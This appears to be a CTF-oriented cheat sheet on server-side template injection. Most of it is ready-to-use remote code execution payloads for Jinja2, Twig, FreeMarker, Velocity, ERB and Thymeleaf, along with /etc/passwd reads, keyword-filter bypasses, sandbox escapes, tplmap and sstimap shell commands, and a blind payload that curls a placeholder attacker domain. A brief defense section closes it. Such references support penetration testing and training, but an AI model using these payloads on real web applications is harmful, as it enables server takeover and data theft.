# Server-Side Template Injection (SSTI) Cheat Sheet

## 📌 What is SSTI?

Server-Side Template Injection occurs when user input is embedded into a template engine and executed server-side. This can lead to Remote Code Execution (RCE), allowing attackers to run arbitrary code on the server.

**Vulnerable Pattern:**
```python
# User input directly in template
template = "Hello " + user_input
render_template_string(template)
```

---

## 🔍 Detection & Identification

### Basic Detection Payloads

Test with mathematical expressions to detect template injection:

```
{{7*7}}           → 49 (Jinja2, Twig)
${7*7}            → 49 (FreeMarker, Velocity, Thymeleaf)
<%= 7*7 %>        → 49 (ERB)
#{7*7}            → 49 (Thymeleaf inline)
${{7*7}}          → 49 (Multiple engines)
*{7*7}            → 49 (Thymeleaf)
@(7*7)            → 49 (Razor)
```

### Detection Decision Tree

```
Input: {{7*7}}
├─ Output: 49        → Template Injection Confirmed
├─ Output: {{7*7}}   → Not vulnerable or wrong syntax
├─ Output: 777       → String concatenation (try other payloads)
└─ Error message     → Check error for template engine name
```

---

## 🎯 Template Engine Identification

### By Syntax Response

| Payload | If Returns 49 | Template Engine | Language |
|---------|---------------|-----------------|----------|
| `{{7*7}}` | ✅ | Jinja2, Twig, Nunjucks | Python, PHP, JS |
| `${7*7}` | ✅ | FreeMarker, Velocity, Thymeleaf | Java |
| `<%= 7*7 %>` | ✅ | ERB, JSP | Ruby, Java |
| `#{7*7}` | ✅ | Thymeleaf (inline) | Java |

### Template-Specific Tests

**Jinja2 (Python/Flask):**
```python
{{config}}          # Should show Flask config
{{self}}            # Shows template object
{{request}}         # Shows request object
```

**Twig (PHP):**
```php
{{_self}}           # Shows template object
{{app}}             # Shows application object
{{dump(app)}}       # Dumps app object
```

**FreeMarker (Java):**
```java
${product.class}    # Shows class
${"freemarker.template.utility.Execute"?new()}  # RCE test
```

**ERB (Ruby):**
```ruby
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>
```

**Thymeleaf (Java):**
```java
${7*7}
*{7*7}
#{7*7}
```

---

## 🚀 Exploitation Payloads

## Jinja2 (Python) - Most Common in CTFs

### Basic RCE Methods

**Method 1: Via `request.application`**
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Method 2: Via `config`**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Method 3: Via `lipsum` (Jinja2 global function)**
```python
{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Method 4: Via `cycler`**
```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

**Method 5: Via `joiner`**
```python
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Method 6: Via `namespace`**
```python
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### MRO (Method Resolution Order) Exploitation

```python
# List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes (look for subprocess.Popen, warnings.catch_warnings, etc.)
# Example with index 414 (adjust based on your output)
{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### Common Commands

```python
# List files
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

# List with details
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}

# Current directory
{{request.application.__globals__.__builtins__.__import__('os').popen('pwd').read()}}

# Read file
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

# Find files
{{request.application.__globals__.__builtins__.__import__('os').popen('find / -name flag* 2>/dev/null').read()}}

# Environment variables
{{request.application.__globals__.__builtins__.__import__('os').popen('env').read()}}

# Whoami
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

### Using subprocess Module

```python
{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('ls',shell=True).decode()}}

{{request.application.__globals__.__builtins__.__import__('subprocess').Popen('ls',shell=True,stdout=-1).communicate()[0].strip()}}
```

---

## Twig (PHP)

### Basic RCE

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat /etc/passwd")}}

{{['id']|filter('system')}}

{{['cat /etc/passwd']|filter('passthru')}}
```

### File Read

```php
{{'/etc/passwd'|file_excerpt(1,30)}}
```

---

## FreeMarker (Java)

### RCE Methods

```java
# Execute commands
${"freemarker.template.utility.Execute"?new()("id")}

${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}

# Object instantiation
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}

# Built-in exploit
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```

---

## Velocity (Java)

### RCE

```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

## ERB (Ruby)

### RCE

```ruby
<%= system("id") %>

<%= `id` %>

<%= IO.popen('id').readlines() %>

<%= File.open('/etc/passwd').read %>
```

---

## Thymeleaf (Java)

### RCE

```java
# SpringEL injection
${T(java.lang.Runtime).getRuntime().exec('calc')}

# With request object
${request.setAttribute("c","calc")}
${T(java.lang.Runtime).getRuntime().exec(request.getAttribute("c"))}
```

---

## 🛡️ Filter Bypass Techniques

### Keyword Filtering Bypasses

**String Concatenation:**
```python
# Bypass "import" filter
{{request.application.__globals__.__builtins__['__imp'+'ort__']('os').popen('id').read()}}

# Bypass "os" filter
{{request.application.__globals__.__builtins__.__import__('o'+'s').popen('id').read()}}
```

**Using `attr` Filter (Jinja2):**
```python
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os').popen('id').read()}}
```

**Character Encoding:**
```python
# Hex encoding
{{request.application.__globals__.__builtins__['\x5f\x5fimport\x5f\x5f']('os').popen('id').read()}}

# Unicode encoding
{{request.application.__globals__.__builtins__['\u005f\u005fimport\u005f\u005f']('os').popen('id').read()}}
```

**Using `~` for String Concatenation:**
```python
{{'__imp' ~ 'ort__'}}
```

**Indirect Access:**
```python
# If "config" is blocked
{{request.application.__self__._get_data()}}
```

---

## 🔧 Advanced Techniques

### File Read without RCE (Jinja2)

```python
# Read files through URL encoding
{{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}

# Using file object
{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
```

### Blind SSTI Detection

If no output is reflected, try:

```python
# Time-based detection (sleep)
{{request.application.__globals__.__builtins__.__import__('time').sleep(10)}}

# DNS exfiltration (if you control a domain)
{{request.application.__globals__.__builtins__.__import__('os').popen('curl your-domain.com').read()}}

# Error-based detection
{{undefined_variable}}
{{1/0}}
```

### Sandbox Escape (Jinja2 Sandbox)

```python
# Escape sandboxed Jinja2
{{request.__class__.__mro__[9].__subclasses__()[7].__init__.__globals__['sys'].modules['os'].popen('id').read()}}

# Alternative method
{{().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()')}}
```

---

## 🎯 Common Flag Locations in CTFs

```bash
# Current directory
./flag
./flag.txt
./flag.php

# Root directory
/flag
/flag.txt

# Home directories
/home/user/flag.txt
/root/flag.txt

# App directories
/app/flag
/var/www/html/flag.txt

# Use find command
find / -name "*flag*" 2>/dev/null
find . -name "*flag*"
```

---

## 🧪 Testing Methodology

### Step 1: Detect SSTI
```
1. Try basic payloads: {{7*7}}, ${7*7}, <%= 7*7 %>
2. Check if output is 49 or error message
3. Note the template engine from error/response
```

### Step 2: Identify Template Engine
```
1. Try engine-specific payloads ({{config}}, {{_self}}, etc.)
2. Analyze error messages for engine name/version
3. Test syntax variations
```

### Step 3: Explore Environment
```
1. List available objects/functions
2. Check for restricted functions
3. Identify available modules
```

### Step 4: Achieve RCE
```
1. Try direct RCE payloads
2. If blocked, try bypass techniques
3. Execute commands (ls, pwd, cat, etc.)
```

### Step 5: Extract Flag
```
1. List files in current directory
2. Search for flag files
3. Read flag file
4. Exfiltrate if needed
```

---

## 🛠️ Automated Tools

### Tplmap
```bash
# Automatic SSTI scanner
tplmap -u 'http://target.com/page?name=test'

# With POST data
tplmap -u 'http://target.com/page' -d 'name=test'

# Specify engine
tplmap -u 'http://target.com/page?name=test' --engine Jinja2

# Execute command
tplmap -u 'http://target.com/page?name=test' --os-shell
```

### SSTImap
```bash
# Scanner and exploitation tool
sstimap -u 'http://target.com/page?name=test'

# Interactive shell
sstimap -u 'http://target.com/page?name=test' --interactive
```

### Manual with Burp Suite
```
1. Capture request in Proxy
2. Send to Repeater
3. Insert SSTI payloads in parameters
4. Analyze responses
5. Use Intruder for payload fuzzing
```

---

## 🛡️ Defense & Prevention

### For Developers

**Don't:**
```python
# NEVER do this
template = "Hello " + user_input
render_template_string(template)
```

**Do:**
```python
# Use parameterized templates
render_template('hello.html', name=user_input)

# Enable auto-escaping
from jinja2 import Environment
env = Environment(autoescape=True)

# Use sandboxed environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Validate input
from markupsafe import escape
safe_input = escape(user_input)
```

### Security Best Practices

1. **Never use user input directly in templates**
2. **Enable template auto-escaping**
3. **Use sandboxed template environments**
4. **Implement strict input validation**
5. **Use Content Security Policy (CSP)**
6. **Keep frameworks/engines updated**
7. **Principle of least privilege**
8. **Regular security audits**

### Jinja2 Specific

```python
# Sandboxed environment
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# Restrict dangerous functions
env.globals.clear()
env.filters.clear()

# Whitelist safe functions only
env.globals['safe_function'] = safe_function
```

---

## 📚 Quick Reference Table

| Template Engine | Language | Detection | RCE Payload |
|----------------|----------|-----------|-------------|
| Jinja2 | Python | `{{7*7}}` | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| FreeMarker | Java | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
| Velocity | Java | `${7*7}` | Complex RCE (see above) |
| ERB | Ruby | `<%= 7*7 %>` | `<%= system("id") %>` |
| Thymeleaf | Java | `${7*7}` | `${T(java.lang.Runtime).getRuntime().exec('id')}` |

---

## 🔗 Resources

### Documentation
- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [Twig Documentation](https://twig.symfony.com/)
- [FreeMarker Documentation](https://freemarker.apache.org/)

### Security Research
- [PortSwigger - SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP - SSTI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

### Tools
- [Tplmap](https://github.com/epinna/tplmap)
- [SSTImap](https://github.com/vladko312/SSTImap)

---

**Last Updated:** January 29, 2026
